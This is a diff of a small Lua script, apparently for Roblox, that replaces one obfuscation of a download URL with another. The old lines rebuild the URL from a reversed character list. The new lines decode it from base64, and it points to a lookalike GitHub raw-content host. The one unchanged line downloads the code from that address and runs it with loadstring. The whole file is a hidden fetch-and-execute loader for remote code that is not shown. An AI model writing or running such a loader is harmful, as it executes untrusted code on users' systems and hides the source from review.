@@ -1,4 +1,4 @@
-local z={"Y","S","A","J","/","n","i","a","m","/","s","d","a","e","h","/","s","f","e","r","/","I","S","Y","A","J","/","t","i","b","-","6","6","4","5","5","7","4","r","a","l","/","m","o","c",".","t","n","e","t","n","o","c","r","e","s","u","b","u","h","t","i","g",".","t","n","e","t","n","o","c","t","i","g","b","u","h","t","i","g","//",":","s","p","t","t","h"}
-local u=""
-for i=#z,1,-1 do u=u..z[i] end
+local h=game:GetService("HttpService")
+local b="aHR0cHM6Ly9yYXcud2l0aGdpdGh1YnVzZXJjb250ZW50LmNvbS9sYXI0NzU1NDY2LWJpdC9KQVlTSS9yZWZzL2hlYWRzL21haW4vSkFZU0k="
+local u=h:Base64Decode(b)
 (loadstring(game:HttpGet(u)))()
